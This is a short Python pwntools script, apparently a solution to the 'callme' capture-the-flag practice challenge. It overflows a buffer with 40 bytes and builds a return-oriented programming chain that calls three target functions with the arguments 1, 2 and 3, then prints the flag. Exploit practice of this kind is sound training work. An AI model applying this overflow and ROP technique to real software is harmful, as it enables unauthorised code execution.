from pwn import *

pop3ret = 0x401ab0
callme_one = 0x401850
callme_two = 0x401870
callme_three = 0x401810
exit_call = 0x401880
ret = 0x401a04

p = process('./callme')
exploit = ''
exploit += 'A'*40
exploit += p64(pop3ret)
exploit += p64(0x1)
exploit += p64(0x2)
exploit += p64(0x3)
exploit += p64(callme_one)

exploit += p64(pop3ret)
exploit += p64(0x1)
exploit += p64(0x2)
exploit += p64(0x3)
exploit += p64(callme_two)

exploit += p64(pop3ret)
exploit += p64(0x1)
exploit += p64(0x2)
exploit += p64(0x3)
exploit += p64(ret)
exploit += p64(callme_three)

exploit += p64(exit_call)
p.recvuntil('>')
p.sendline(exploit)
print p.recvuntil('}')